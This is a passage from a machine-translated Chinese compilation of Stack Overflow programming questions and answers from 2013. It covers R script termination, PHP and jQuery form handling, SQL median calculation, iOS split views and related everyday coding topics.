COMPLETE     = 2013-01-15 19:36:42
TERMINAL     = 2013-01-15 20:36:42 
```

* * *

（格伦杰克曼根据新要求添加编辑）

```
events=(INITIAL PREPARING SCHEDULED TRANSLATING LOADING COMPLETE TERMINAL)

while IFS=, read -r TASK_ID STATUS_COUNT rest; do
    IFS=, read -ra STATUSES <<< "$rest"

    for (( i=0; i < ${#STATUSES[@]}; i+=2 )); do
        # if this this the initial event, reset all statuses
        if [[ ${STATUSES[i]} == ${events[0]} ]]; then
            for event in "${events[@]}"; do
                declare "$event="
            done
        fi
        declare "${STATUSES[i]}=${STATUSES[i+1]}"
    done
    for var in TASK_ID STATUS_COUNT "${events[@]}"; do
        printf "$%s = %s\n" $var "${!var:-<NULL>}"
    done

done 
```

# r - 停止 R 程序而不会出错

> ID：14469522
> 
> 赞同：33
> 
> 时间：2013-01-22T22:50:07.497
> 
> 标签：r, debugging

有什么方法可以无错误地停止 R 程序吗？

例如，我有一个很大的来源，定义了几个函数，之后有一些函数调用。碰巧我编辑了一些函数，并希望在 R 环境中更新函数定义，但实际上并没有调用它们。

我定义了一个变量`justUpdate`，当它`TRUE`想要在函数定义之后停止程序时。

```
ReadInput <- function(...) ...
Analyze <- function(...) ...
WriteOutput <- function(...) ...

if (justUpdate)
    stop()
# main body
x <- ReadInput()
y <- Analyze(x)
WriteOutput(y) 
```

我已经调用`stop()`了函数，但问题是它会打印一条错误消息。

`ctrl`+`c`是另一种选择，但我想在特定行中停止源。

`q()`or的问题`quit()`在于它终止了 R 会话，但我希望 R 会话仍然打开。

正如@JoshuaUlrich 建议的那样`browser()`，可以是另一种选择，但仍然不完美，因为源在新环境中终止（即 R 提示符将更改为`Browser[1]>`而不是`>`）。我们仍然可以按`Q`退出它，但我正在寻找直接的方法。

另一种选择是使用`if (! justUpdate) { main body }`，但它正在清除问题，而不是解决问题。

有没有更好的选择？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2017-03-22T07:29:14.357

[我在这里](http://tolstoy.newcastle.edu.au/R/e5/help/08/11/6953.html)找到了一个相当巧妙的解决方案。诀窍是在调用之前关闭所有错误消息`stop()`。该功能`on.exit()`用于确保之后再次打开错误消息。该函数如下所示：

```
stop_quietly <- function() {
  opt <- options(show.error.messages = FALSE)
  on.exit(options(opt))
  stop()
} 
```

第一行关闭错误消息并将旧设置存储到变量`opt`中。在此行之后，发生的任何错误都不会输出消息，因此也`stop()`不会导致打印任何消息。

根据 R 帮助，

> `on.exit`记录作为其参数给出的表达式需要在当前函数退出时执行。

当前函数是，它在被调用`stop_quietly()`时退出。`stop()`所以程序做的最后一件事是 call `options(opt)`，它将设置`show.error.messages`为它在被调用之前所拥有的值`stop_quietly()`（大概，但不一定，`TRUE`）。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2015-11-25T12:01:44.410

[这里](https://www.mail-archive.com/r-help@r-project.org/msg117700.html)的邮件列表中有一个很好的解决方案，它定义了一个`stopQuietly`基本上*隐藏*函数显示的错误的`stop`函数：

```
stopQuietly <- function(...) {
  blankMsg <- sprintf("\r%s\r", paste(rep(" ", getOption("width")-1L), collapse=" "));
  stop(simpleError(blankMsg));
} # stopQuietly()

> stopQuietly() 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2017-06-12T21:10:33.373

我有一个类似的问题，根据@VangelisTasoulas 的回答，我得到了一个简单的解决方案。
在函数内部，我必须检查数据库是否已更新。如果不是，则停止执行。

```
r=readline(prompt="Is DB updated?(y/n)")
Is DB updated?(y/n)n
if(r != 'y') stop('\r Update DB')
Update DB 
```

只需放入`\r`消息的开头，覆盖`Error:`消息。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2013-01-22T22:53:23.753

您正在寻找功能`browser`。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2018-08-24T19:57:00.013

您可以使用以下解决方案来停止 R 程序而不会出错：

```
if (justUpdate)
    return(cat(".. Your Message .. ")) 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-11-20T15:31:48.217

只是`return`在你想退出该功能的那一行：

```
f <- function(x, dry=F) { 
   message("hi1")
   if (dry) return(x)
   message("hi2")
   x <- 2*x 
}
y1 <- f(2) # = 4 hi1 hi2
y2 <- f(2, dry=T) # = 2 hi1 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2022-01-24T14:02:18.207

我发现编写脚本并使用`source()`. 在脚本中，将退出语句作为一种特殊的错误类编写，a`tryCatch()`可以将其作为消息接收并发送回：

```
exit <- function(..., .cl = NULL) {
  # Use to capture acceptable stop
  cond <- structure(
    list(.makeMessage(...), .cl),
    class = c("exitError", "error", "condition"),
    names = c("message", "call")
  )

  stop(cond)
}

foo <- function() {
  exit("quit here")
  1
}

tryCatch(
  # rather than foo(), you might use source(filename)
  foo(),
  exitError = function(e) message(e$message)
)
#> quit here 
```

^(由[reprex 包](https://reprex.tidyverse.org)于 2022-01-24 创建(v2.0.1))

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-11-24T11:27:15.853

除了 Stibu 于 17 年 3 月 22 日 7:29 的回答之外，如果您想要将消息作为 stop() 的一部分写入，则不会写入此消息。

我觉得奇怪的是必须使用以下两行意思 on.exit(options(options(show....))) 不起作用。

```
opt <- options(show.error.messages = F)
on.exit(options(opt)) 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-12-25T22:29:07.517

我忘记了这个问题的答案，需要查找并登陆这里......你在你的问题中发布了答案的提示......

> ctrl+c 是另一种选择，但我想在特定行中停止源。

[发出错误、警告或消息的信号](https://rlang.r-lib.org/reference/abort.html)

```
rlang::inform("Updated Only")
rlang::interrupt()
```

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2019-11-22T07:36:51.820

为什么不直接使用 if () {} else {}？这只是几个字符...

```
f1 <- function(){}
f2 <- function(){}

if (justUpdate) {
} else {
# main body 
} 
```

甚至

```
f1 <- function(){}
f2 <- function(){}

if (!justUpdate) {
# main body 
} 
```

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2020-12-15T06:08:08.090

下面的代码对我的工作停止了，没有错误消息。

```
opt <- options(show.error.messages = FALSE)
on.exit(options(opt))
break 
```

# php - 将 jQuery tag-it 输入保存为 php 数组

> ID：14469526
> 
> 赞同：1
> 
> 时间：2013-01-22T22:50:23.797
> 
> 标签：php, jquery, arrays, jquery-ui, tag-it

我正在使用 jQuery Tag-it！为我的用户创建一个“技能”输入表单。我有 tag-it 的 UI 工作，但我无法让用户输入到 PHP 数组中。我正在尝试序列化这个数组并将其保存到 mysql 数据库中以便稍后显示，但我什至无法将数据放入数组中。

这是javascript初始化标签：

```
$('#skills').tagit({     
    allowSpaces: true,
    placeholderText: "Separate skills with a comma please",
    autocomplete: true
}); 
```

这是HTML：

```
<div>
    <label class="add_label">Skills: </label>
    <ul id="skills" style="width: 275px; margin-bottom: 8px;"></ul>
</div> 
```

这是创建应该存储用户输入的输入字段的javascript：

```
if (!this.options.singleField) {
       var escapedValue = label.html();
       tag.append('<input type="hidden" style="display:none;" value="' + escapedValue + '" name="' + this.options.fieldName + '" />');
} 
```

这是获取用户输入的 PHP —— 这是不工作的部分。我无法从表单中检索任何数据：

```
$skillsArr = $link->real_escape_string($_POST['skills']); 
```

当我提交表单时，mysqli 查询执行并且在数据库中我看到“N;” 序列化数组应该在哪里。

如何将 jQuery Tag-it 值放入可以序列化并保存到 mysql 数据库的 PHP 数组中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-28T13:24:03.217

我发现在后端（php/mysqli）上执行所有查询更容易。

这样，我在 jQuery 自动完成中唯一需要的是：

```
<script>
$(document).ready(function(){
  $("#tagit").tagit({
    autocomplete: {
   source: "ajax-search.php",
}
  });
});
</script> 
```

我刚刚定义了文件的来源。您可以根据需要添加分隔符等（我只是修改了源代码）。

但主要功能来自 php 文件，该文件返回 JSON 编码结果。

```
<?php
include("dbconnect.php"); //Including our DB Connection file

    if ( !isset($_REQUEST['term'])) //if there's no search, exit
  exit;

    $keyword = trim($_REQUEST['term']);
    $keyword = mysqli_real_escape_string($db, $keyword);
    $query = "SELECT * FROM animals WHERE english LIKE '%$keyword%' LIMIT 10";
    $result = mysqli_query($db, $query); //Run the Query

    $data = array(); //initialize array

    if ($result && mysqli_num_rows($result)){
   while($row = mysqli_fetch_assoc($result)){
      $data[] = array(
        'id' => $row['row_id'],
    'label' => $row['english'], //This is the 'live return of the search
    'value' => $row['eng_dir'], //The value returned. Not needed if you're returning the label
    'latin' => $row['latin'] //Another result (you can add more)
       );
    }
     }
    echo json_encode($data);
    flush();
  ?> 
```

然后在 tag-it.js 文件中，您可以选择要作为标签推送的内容：

```
if (this.options.availableTags || this.options.tagSource || this.options.autocomplete.source) {
   var autocompleteOptions = {
   select: function(event, ui) {
     that.createTag(ui.item.id); //pushes the ID
 that.createTag(ui.item.value); //pushes the value
     that.createTag(ui.item.label); //pushes the label
     that.createTag(ui.item.latin); //pushes the extra variable
 // Preventing the tag input to be updated with the chosen value.
 return false;
    }
   };
  $.extend(autocompleteOptions, this.options.autocomplete); 
```

上面的代码将根据您的结果返回相同标签的 4 个实例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-24T15:49:47.243

问题是 tag-it 默认会发送带有如下数据的 post 请求：

```
tags=foo&tags=bar&tags=blah 
```

PHP 将通过使 $_POST['tag'] ='blah' 来解释它。为了让 PHP 像数组一样处理它，发布数据需要如下所示：

```
tags[]=foo&tags[]=bar&tags[]=blah 
```

解决这个问题的最简单方法就是在设置 tag-it 时更改 fieldName 参数，例如：

```
$('.taglist').tagit({
    allowSpaces: true,
    placeholderText: 'add new tag here...',
    fieldName: 'tags[]'
}); 
```

通过简单地更改名称以包含 [] 然后它将被 PHP 解释为您想要的并成为一个数组。

或者，如果您无法调整，您始终可以处理原始 PHP 数据以将标签作为数组获取，例如：

```
$query = array();
foreach (explode('&', file_get_contents('php://input')) as $kv) {
    list($k, $v) = explode('=', $kv);
    $k = urldecode($k);
    $v = urldecode($v);
    if (!isset($query[$k])) {
        $query[$k] = $v;
    } else {
        if (is_array($query[$k])) {
            $query[$k][] = $v;
        } else {
            $query[$k] = array($query[$k], $v);
        }
    }
} 
```

现在 $query['tags'] 将是一个预期的数组。

注意：如果只发送一个标签，那么它最终会成为带有上述代码的字符串，所以如果结果进入循环或其他东西，请确保将其转换为数组：

```
foreach((array)$query['tags'] as $tag) ... 
```

# php - 如何创建jquery悬停

> ID：14469532
> 
> 赞同：0
> 
> 时间：2013-01-22T22:51:20.230
> 
> 标签：php, javascript, jquery, html

如何创建一个 jQuery`hover`来显示`div`鼠标悬停时的 twitter repla 转发和收藏？

这是我的 HTML：

```
<div style="display:none;" id="blab">
  <?php echo $blab_id; ?>
</div>
<a href="blab.php?id=<?php echo $blab_id; ?>">
    <div class="blab_body" id="hover" value="Hide">
        <table>
            <tr>
                <td valign="top">
                    <img src="<?php echo $profile_pic_info; ?>" class="blab_image" width="50" height="50" />
                </td>
                <td>&nbsp;</td>
                <td>
                    <table>
                        <tr>
                            <td valign="top">
                                <a href="profile.php?id=$mem_id">
                                    <strong><?php echo $added_fullname; ?></strong>
                                </a>
                                <?php echo $added_to_fullname; ?>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <?php echo $blab_body; ?>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <text style="color:gray;">
                                    <?php echo $blab_date; ?>|<?php echo $device; ?>
                                </text>
                            </td>
                        </tr>
                    </table>
                </td>
            </tr>
        </table>
        <div style="background:#000; display:none;" id="id">&nbsp;</div>
    </div>
</a>
<hr /> 
```

这是我的 JavaScript 代码：

```
$('#id').hide();

$('#hover').hover(function () {
    var blab_id = $('#blab').text();
    $('#id').show();
}, function () {
    $('#id').hide();
}); 
```

它`div`仅显示第一个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:09:39.303

**一个ID在整个页面只能使用一次！**如果您在页面上插入多个副本`div`，您的 HTML 代码将失效。这就是为什么 jQuery 只将事件处理程序附加到第一个元素。

解决方案是使用`class="hover_enabled"`，而不是`id="hover"`因为它允许将相同的类添加到多个元素。以下是您在 jQuery 中的操作方式：

```
$('.hover_enabled').hover(function() { ... 
```

同样的事情也适用于`#id`.

# javascript - 基于 Javascript / Node.js 的 Fabric 等价物？

> ID：14469533
> 
> 赞同：12
> 
> 时间：2013-01-22T22:51:25.153
> 
> 标签：javascript, node.js, deployment, fabric

我喜欢[Fabric](http://docs.fabfile.org/en/1.5/)如何轻松处理多台服务器的部署（适当支持 SSH 等）。但是，由于我们的项目是基于 node.js 的，如果我们可以在 Javascript 而不是 Python 中执行此操作，那就太好了。

与 Fabric 最接近的 node.js/Javascript 是什么？（如果有的话！）

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2014-02-18T14:03:43.333

我编写了[Flightplan](https://github.com/pstadler/flightplan)，这是一个 node.js 库，它完全符合您的要求。它基本上让您可以针对本地主机和不同的远程主机集运行一系列 shell 命令。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-31T15:43:35.250

Fabric 基本上是一个高级 ssh 客户端。[这个问题](https://stackoverflow.com/questions/5180981/ssh-client-for-node-js)的答案列出了几个 Javascript ssh 客户端：

1.  [SSH2 客户端](http://github.com/mscdex/ssh2)
2.  [节点SSH](https://github.com/VanCoding/NodeSSH)
3.  [节点控制](https://github.com/tsmith/node-control)

# sqlite - 黑莓使用 Sqlite

> ID：14469534
> 
> 赞同：0
> 
> 时间：2013-01-22T22:51:26.440
> 
> 标签：sqlite, blackberry

我在黑莓 OS 7 中使用 SQ-LITE，当我尝试在模拟器中从 SD 卡读取数据时，我将用户数据存储在 SD 卡中，我应该删除并重新插入 SD 购物车图像。即使使用黑莓 BOLD 9900 我也有同样的问题。有人可以帮我吗，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T14:18:16.873

我有许多屏幕，其中包含使用选择请求的 SQ_LITE 数据列表，当我尝试在模拟器或设备中运行其中一个时，我应该移除并重新插入 SD 卡以工作，我认为问题在于在 SD_card 上创建数据库时应用程序启动，所以我尝试评论创建数据库和表，它可以工作。也许我必须在用户第一次打开应用程序时运行一次谢谢

# php - 不断的密码检查？

> ID：14469535
> 
> 赞同：0
> 
> 时间：2013-01-22T22:51:31.017
> 
> 标签：php, login, passwords

我在stackoverflow上阅读了以下内容：

```
never store the users password or even a hash of the password in session or cookie data. 
```

我正在制作一个系统来检查恒定密码，如果它与会话中保存的密码不同，则强制注销；像facebook这样的东西吗？当您更改密码或密码已更改时，您将被注销。

我的代码如下：

```
function ConstantPassword($Password)
{
    if ($_SESSION['Password'] !== $Password)
    {
        include "Logout.php";
    }
} 
```

但是，如果说不要在会话/cookie 中存储密码？什么可能是另一种解决方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:52:32.170

您可以将盐（或其哈希）存储在会话中。

更改密码应该会更改盐，这将使会话无效。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T22:55:00.897

您可以进行一次检查，然后存储一个`$_SESSION['logged_in'] = TRUE`变量。在注销时，你`unset($_SESSION['logged_in'])`和`session_destroy()`会话。无需在会话中输入密码或盐。

此外，你不应该自己实现密码，而是使用这个：[https](https://github.com/ircmaxell/password_compat) ://github.com/ircmaxell/password_compat这是 PHP 5.5 中的库。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T23:01:13.543

检查密码一次，然后在数据库中存储一对 (random_hash,user_id) 并将 random_hash 放入会话中。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-01-22T22:58:18.890

如果您想避免在会话中存储密码，您可以存储**最后一次密码更改的时间戳，**并在每次请求时根据数据库验证它。

# windows-phone-7 - WP7 TextBlock 在按钮按下时可见

> ID：14469537
> 
> 赞同：0
> 
> 时间：2013-01-22T22:51:34.023
> 
> 标签：windows-phone-7

我有 1 个文本框、1 个文本块和 1 个按钮。

当按下按钮时，我希望 TextBlock 只有在 TextBox 中没有数据时才可见。如果 TextBox 中有数据，那么我希望它继续到下一页（Page1）。

当我运行代码并单击按钮时；无论 TextBox 中是否有数据，按钮都会将我发送到下一个 Page1，只有在 TextBox 中有文本时它才应该去（我在 TextBox 中没有任何文本的情况下对此进行了测试）。

```
 private void btnContinue_Click(object sender, RoutedEventArgs e)
    {
        if (ProfileNameTextBox.Text == null)
        {
            textBlockError.Visibility = Visibility.Collapsed;
        }
        else
        {
            NavigationService.Navigate(new Uri("/Page1.xaml", UriKind.Relative));
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:58:00.407

有几件事：

1.  尝试将检查文本更改为`string.IsNullOrEmpty()`
2.  调试时显示的值是什么？
3.  您的逻辑与您的陈述不匹配“我希望 TextBlock 仅在 TextBox 中没有数据时可见。” 从您的代码中，当没有数据时，您将隐藏文本框......

# perl - Perl 和 wireshark 导出文件对话框

> ID：14469539
> 
> 赞同：0
> 
> 时间：2013-01-22T22:51:48.217
> 
> 标签：perl, wireshark

我有兴趣在 Wireshark 中打开一个捕获文件，然后以“C 数组”格式导出数据 [Wireshark 在其 GUI 中提供了该选项。可以通过主菜单中的“文件->导出->作为 C 数组文件”来做到这一点。我的问题是如何在 perl 中做到这一点？有人可以帮我写一个脚本吗？

* * *

我想解析wireshark捕获的每一个数据包。所以我想，我会先将每个数据包转换为一个数组，然后解析它。你对此有什么建议吗？我的捕获包含所有 IEEE 802.11 帧。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-02T06:01:10.410

如果您想自己进行所有解析，即查看原始数据包数据，我建议您使用 libpcap 编写自己的程序来读取 pcap 格式的捕获文件（在 UN*X 上，libpcap 1.1.0 及更高版本也可以读取 pcap -ng-format 捕获文件，这是 Wireshark 1.8.0 及更高版本默认写入的内容）。无需将内容写成 C 数组。

# ipad - 在 SplitView 应用程序中更新详细视图 UTableView？

> ID：14469546
> 
> 赞同：0
> 
> 时间：2013-01-22T22:52:31.187
> 
> 标签：ipad

我`m working on a splitview app , where the master view is a table view fetched from sqlite database ,when the user tab a row the detail view UITableView get updated by data also fetched from the same sqlite database. I`可以填充主视图表视图，但无法获取详细视图表视图以使用新数据进行更新？我到处搜索如何做到这一点，但无济于事，大多数教程和答案都是关于标签或 webview 的，但从来没有找到关于 detailview 表视图的东西。

我正在使用 stroyboard 和 xcode 4.5.2

这是masterviewcontroller.m didSelectRowAtIndexPath

```
 - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath    *)indexPath
  {
      Destinations *dest = [self.destinations objectAtIndex:[indexPath row]];
       self.detailViewController.title = dest.destName;
      self.detailViewController.detailItem = dest.destID;
      [self.tableView reloadData];
 } 
```

这是detailviewcontroller.h

```
#import <UIKit/UIKit.h>
#import "FMDatabase.h"

@interface DetailViewController : UIViewController<UITableViewDelegate,  UITableViewDataSource,UISplitViewControllerDelegate>
{
   NSMutableArray *alternates;
   UITableView *alternateTableView;
}

@property (nonatomic,strong) NSMutableArray *alternates;

@property (strong, nonatomic) id detailItem;

@property (weak, nonatomic) IBOutlet UILabel *detailDescriptionLabel;
@property (strong, nonatomic) IBOutlet UITableView *alternateTableView;

@property (retain, nonatomic) NSString *pdestid;

@end 
```

detailviewcontroller.m

```
#import "DetailViewController.h"
#import "Alternates.h"

@interface DetailViewController ()

@property (strong, nonatomic) UIPopoverController *masterPopoverController;
- (void)configureView;
@end

@implementation DetailViewController
@synthesize pdestid, alternates,alternateTableView;

#pragma mark - Managing the detail item

- (void)setDetailItem:(id)newDetailItem
{
    if (_detailItem != newDetailItem) {
       _detailItem = newDetailItem;

        // Update the view.

       [self configureView];
  }

    if (self.masterPopoverController != nil) {
    [self.masterPopoverController dismissPopoverAnimated:YES];
    }        
}

 - (void)configureView
{
   // Update the user interface for the detail item.

    if (self.detailItem) {
       self.detailDescriptionLabel.text = [self.detailItem description];
       self.pdestid = [self.detailItem description];
       NSFileManager * fileManager = [NSFileManager defaultManager];
       NSError *error;
       NSArray * paths = NSSearchPathForDirectoriesInDomains (NSDocumentDirectory, NSUserDomainMask, YES);
       NSString * documentsDirectory = [paths objectAtIndex: 0];
       NSString * writableDBPath = [documentsDirectory stringByAppendingPathComponent: @"alternates.s3db"];
        BOOL success = [fileManager fileExistsAtPath: writableDBPath];
       if (! success) {
           NSString * defaultDBPath = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent: @"alternates.s3db"];
           success = [fileManager copyItemAtPath: defaultDBPath toPath: writableDBPath error: & error];
        }
        FMDatabase * db = [FMDatabase databaseWithPath: writableDBPath];
        if (! [db open])
        {
           NSLog (@"Err% d:%@", [db lastErrorCode], [db lastErrorMessage]);
        }
       [db setShouldCacheStatements: YES];
       NSString * sql = [NSString stringWithFormat:@"SELECT * FROM Alternates WHERE destID  = '%@' ORDER BY altName ASC;", pdestid];
       FMResultSet * rs = [db executeQuery: sql];
       alternates = [[NSMutableArray alloc] init];
       while ([rs next])
        {
           Alternates * alter = [[Alternates alloc] init];
           alter.altname = [rs stringForColumn: @"altName"];
           alter.alticao = [rs stringForColumn: @"altICAO"];
           alter.dist = [rs stringForColumn:@"distance"];
           alter.mgtrk  =[rs stringForColumn:@"magtrack"];
           alter.route = [rs stringForColumn:@"route"];
           [alternates addObject:alter];

      }

      [rs close];
      [db close];

    }
}

- (void)viewDidLoad
{
// Do any additional setup after loading the view, typically from a nib.
   [super viewDidLoad];

   [self configureView];
}

- (void)didReceiveMemoryWarning
{
   [super didReceiveMemoryWarning];
  // Dispose of any resources that can be recreated.
}

    #pragma mark - Table View

    - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
    {
       return 1;
  }

    - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
  {
      return alternates.count;
  }

   - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
  {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"AlternateCell"];
      Alternates *alter = [self.alternates objectAtIndex:[indexPath row]];

     cell.textLabel.text = alter.altname;

    return cell;
  }

  #pragma mark - Split view

   - (void)splitViewController:(UISplitViewController *)splitController willHideViewController:(UIViewController *)viewController withBarButtonItem:(UIBarButtonItem *)barButtonItem forPopoverController:(UIPopoverController *)popoverController
   {
     barButtonItem.title = NSLocalizedString(@"DESTINATIONS", @"DESTINATIONS");
     [self.navigationItem setLeftBarButtonItem:barButtonItem animated:YES];
     self.masterPopoverController = popoverController;
  }

     - (void)splitViewController:(UISplitViewController *)splitController willShowViewController:(UIViewController *)viewController invalidatingBarButtonItem:(UIBarButtonItem *)barButtonItem
 {
    // Called when the view is shown again in the split view, invalidating the button and popover controller.
   [self.navigationItem setLeftBarButtonItem:nil animated:YES];
   self.masterPopoverController = nil;
   }
     -(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation
   {
     return  YES;
  }

  - (void)viewDidUnload {
   [self setAlternateTableView:nil];
   [super viewDidUnload];
 }
  @end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-24T14:29:03.593

在您`DetailViewController`从数据库中获取数据后是否重新加载表视图`configureView`？

尝试`reloadData`在您的表格视图上添加一个：

```
- (void) configureView
{
    // [... as shown above ...]

    [self.alternateTableView reloadData];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-21T09:49:45.057

如果您的详细信息是 tableviewController，您可能需要在 configureView 添加 [self.tableView reloadData]

# sql - 没有正确排序与领带

> ID：14469554
> 
> 赞同：0
> 
> 时间：2013-01-22T22:53:15.983
> 
> 标签：sql

我正在尝试使用 row_number 来计算箱线图的中位数、下四分位数和上四分位数。但是，由于关系，我的 row_number 排序已关闭。

以下是一些示例数据：

```
CREATE TABLE EStats    
(
    PersonID            VARCHAR(30)     NOT NULL,
    Grade               VARCHAR(25)     NOT NULL,
    CourseDate          Date            NOT NULL
);

INSERT INTO EStats
(
    PersonID, Grade, CourseDate
)

VALUES
    ('100', '91', '2010-03-01'),
    ('101', '96', '2010-03-01'),
    ('102', '88', '2010-03-01'),
    ('103', '92', '2010-03-01'),
    ('104', '81', '2010-03-01'),
    ('105', '85', '2010-03-01'),
    ('106', '91', '2010-03-01'),
    ('107', '89', '2010-03-01'),
    ('108', '99', '2010-03-01'),
    ('109', '88', '2010-03-01'),
    ('110', '81', '2011-03-02'),
    ('111', '77', '2011-03-02'),
    ('112', '88', '2011-03-02'),
    ('113', '76', '2011-03-02'),
    ('114', '69', '2011-03-02'),
    ('115', '70', '2011-03-02'),
    ('116', '75', '2011-03-02'),
    ('117', '88', '2011-03-02'),
    ('118', '76', '2011-03-02'),
    ('119', '95', '2012-03-01'),
    ('120', '96', '2012-03-01'),
    ('121', '90', '2012-03-01'),
    ('122', '80', '2012-03-01'),
    ('123', '85', '2012-03-01'),
    ('124', '94', '2012-03-01'),
    ('125', '89', '2012-03-01'),
    ('126', '97', '2012-03-01'),
    ('127', '94', '2012-03-01'),
    ('128', '72', '2012-03-01'),
    ('129', '88', '2012-03-01'),
    ('130', '91', '2012-03-01') 
```

这是我的一个内部查询，显示排序不起作用：

```
SELECT
    CourseDate,
    Grade,
    ROW_NUMBER() OVER (
        PARTITION BY LEFT(CourseDate, 4)
        ORDER BY Grade ASC) AS RowAsc,
    ROW_NUMBER() OVER (
        PARTITION BY LEFT(CourseDate, 4)
        ORDER BY Grade DESC) AS RowDesc
FROM EStats 
```

请注意，对于 CourseDate 2010-03-01，RowAsc 执行以下操作：

```
10
9
8
6
7
5
3
4
2
1 
```

但是，我需要所有行都有一个按顺序排列的数字，以便在存在偶数数量的情况下计算中位数。（Rank 和 dense_rank 不起作用，因为它们留下了“差距”）。

实际上，下面是整个事情。同样，我正在尝试计算 blox 绘图图表的中位数、下四分位数、上四分位数、最小值和最大值。非常感谢任何帮助！

```
WITH Q3 AS
(
    SELECT
        CourseDate,
        AVG(CAST(Grade AS Numeric)) AS Median

    FROM
    (
        SELECT
            CourseDate,
            Grade,
            ROW_NUMBER() OVER (
                PARTITION BY LEFT(CourseDate, 4)
                ORDER BY Grade ASC) AS RowAsc,
            ROW_NUMBER() OVER (
                PARTITION BY LEFT(CourseDate, 4)
                ORDER BY Grade DESC) AS RowDesc
        FROM EStats
    )x
    WHERE 
        RowAsc IN (RowDesc, RowDesc - 1, RowDesc + 1)
    GROUP BY CourseDate
    --ORDER BY CourseDate
),

Q2 AS
(
    SELECT
        x.CourseDate,
        AVG(CAST(Grade AS Numeric)) AS LowerQuartile

    FROM
    (
        SELECT
            Estats.CourseDate,
            Estats.Grade,
            ROW_NUMBER() OVER (
                PARTITION BY LEFT(EStats.CourseDate, 4)
                ORDER BY Grade ASC) AS RowAsc,
            ROW_NUMBER() OVER (
                PARTITION BY LEFT(Estats.CourseDate, 4)
                ORDER BY Grade DESC) AS RowDesc
        FROM EStats JOIN Q3 on EStats.CourseDate = Q3.CourseDate
        WHERE EStats.Grade < Q3.Median 
    )x
    WHERE
        RowAsc IN (RowDesc, RowDesc - 1, RowDesc + 1)
    GROUP BY x.CourseDate
),

Q4 AS
(
    SELECT
        x.CourseDate,
        AVG(CAST(Grade AS Numeric)) AS UpperQuartile

    FROM
    (
        SELECT
            Estats.CourseDate,
            Estats.Grade,
            ROW_NUMBER() OVER (
                PARTITION BY LEFT(EStats.CourseDate, 4)
                ORDER BY Grade ASC) AS RowAsc,
            ROW_NUMBER() OVER (
                PARTITION BY LEFT(Estats.CourseDate, 4)
                ORDER BY Grade DESC) AS RowDesc
        FROM EStats JOIN Q3 on EStats.CourseDate = Q3.CourseDate
        WHERE EStats.Grade > Q3.Median 
    )x
    WHERE
        RowAsc IN (RowDesc, RowDesc - 1, RowDesc + 1)
    GROUP BY x.CourseDate
)

SELECT Q3.CourseDate, Q3.Median AS Median, Q2.LowerQuartile, Q4.UpperQuartile, MIN(EStats.Grade) AS Min, MAX(EStats.Grade) AS Max
FROM Q3
    JOIN Q2 ON Q3.CourseDate = Q2.CourseDate
    JOIN Q4 ON Q3.CourseDate = Q4.CourseDate
    JOIN EStats ON Q3.CourseDate = EStats.CourseDate
GROUP BY Q3.CourseDate, Q3.Median, Q2.LowerQuartile, Q4.UpperQuartile
ORDER BY Q3.CourseDate 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:33:07.083

试试这个来获得中位数：

```
select avg(case when seqnum*2 = totnum+1 then col
                when seqnum*2 in (totnum, totnum + 2) then col
            end)
from (select t.*, row_number() over (order by col) as seqnum,
             count(*) over () as totnum
      from t
     ) t 
```

它看起来很神秘，但想法是对偶数做你想要的平均值，对其他数字做一个单一的值。如果使用 SQL Server，请记住它使用整数除法。您实际上可以将上述简化为：

```
select avg(case when seqnum*2 in (totnum, totnum+1, totnum+2) then col end) 
```

这是有效的，因为奇数总 cnt 只匹配`totnum+1`，偶数匹配其他两个值。

# asp.net - 比较受影响的行数

> ID：14469564
> 
> 赞同：1
> 
> 时间：2013-01-22T22:53:52.873
> 
> 标签：asp.net, sql, visual-studio-2010

我正在尝试比较一个字符串（网络 ID）并使用 SQL Like 命令，返回受影响的行数（如果找到了用户名）但是在我的代码中我总是得到“-1”，我找不到原因，用户名是正确的，通过在 SQL Server Mgt 中运行查询在 SQL 表中找到。

```
Try
        Dim Con As New SqlConnection
        Con.ConnectionString = "Data Source=WCRDUSMJEMPR9\SQLEXPRESS;Initial Catalog=MicroDB;Integrated Security=True"
        Con.Open()
        Dim SQL2 As String
        SQL2 = "SELECT * from MicroDB_Users WHERE Users LIKE '+@Usercheck+'"
        Dim cmd2 As New SqlCommand(SQL2, Con)
        cmd2.Parameters.AddWithValue("@Usercheck", TextBox1.Text)
